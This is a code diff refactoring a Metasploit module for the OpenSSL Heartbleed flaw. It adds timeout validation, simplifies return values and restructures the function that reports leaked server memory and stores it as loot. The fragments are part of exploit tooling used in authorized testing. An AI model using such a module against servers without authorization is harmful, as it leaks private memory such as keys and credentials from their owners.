@@ -169,6 +169,11 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
+    if response_timeout < 0
+      print_error("RESPONSE_TIMEOUT should be bigger than 0")
+      return
+    end
+
     super
   end
 
@@ -295,10 +300,10 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def bleed()
+  def bleed
     # This actually performs the heartbleed portion
     connect_result = establish_connect
-    return :timeout if (connect_result) == :timeout
+    return if connect_result.nil?
 
     vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat(heartbeat_length))
@@ -343,38 +348,42 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def loot_and_report(heartbeat_data)
-    return if heartbeat_data == :timeout
-    if heartbeat_data
-        print_good("#{peer} - Heartbeat response with leak")
-        report_vuln({
-          :host => rhost,
-          :port => rport,
-          :name => self.name,
-          :refs => self.references,
-          :info => "Module #{self.fullname} successfully leaked info"
-        })
-        if action.name == 'DUMP' # Check mode, dump if requested.
-          pattern = datastore['DUMPFILTER']
-          if pattern
-            match_data = heartbeat_data.scan(pattern).join
-          else
-            match_data = heartbeat_data
-          end
-          path = store_loot(
-            "openssl.heartbleed.server",
-            "application/octet-stream",
-            rhost,
-            match_data,
-            nil,
-            "OpenSSL Heartbleed server memory"
-          )
-          print_status("#{peer} - Heartbeat data stored in #{path}")
-        end
-        vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
-      else
-        vprint_error("#{peer} - Looks like there isn't leaked information...")
-      end
+
+    unless heartbeat_data
+      vprint_error("#{peer} - Looks like there isn't leaked information...")
+      return
     end
+
+    print_good("#{peer} - Heartbeat response with leak")
+    report_vuln({
+      :host => rhost,
+      :port => rport,
+      :name => self.name,
+      :refs => self.references,
+      :info => "Module #{self.fullname} successfully leaked info"
+    })
+
+    if action.name == 'DUMP' # Check mode, dump if requested.
+      pattern = datastore['DUMPFILTER']
+      if pattern
+        match_data = heartbeat_data.scan(pattern).join
+      else
+        match_data = heartbeat_data
+      end
+      path = store_loot(
+        "openssl.heartbleed.server",
+        "application/octet-stream",
+        rhost,
+        match_data,
+        nil,
+        "OpenSSL Heartbleed server memory"
+      )
+      print_status("#{peer} - Heartbeat data stored in #{path}")
+    end
+
+    vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
+
+  end
 
   def getkeys()
     unless datastore['TLS_CALLBACK'] == 'None'
@@ -508,7 +517,7 @@ class Metasploit3 < Msf::Auxiliary
       res = self.send(TLS_CALLBACKS[datastore['TLS_CALLBACK']])
       if res.nil?
         vprint_error("#{peer} - STARTTLS failed...")
-        return
+        return nil
       end
     end
 
@@ -519,13 +528,15 @@ class Metasploit3 < Msf::Auxiliary
     unless server_hello
       vprint_error("#{peer} - No Server Hello after #{response_timeout} seconds...")
       disconnect
-      return :timeout
-    end    
+      return nil
+    end
 
     unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
       vprint_error("#{peer} - Server Hello Not Found")
-      return
+      return nil
     end
+
+    true
   end
 
   def key_from_pqe(p, q, e)
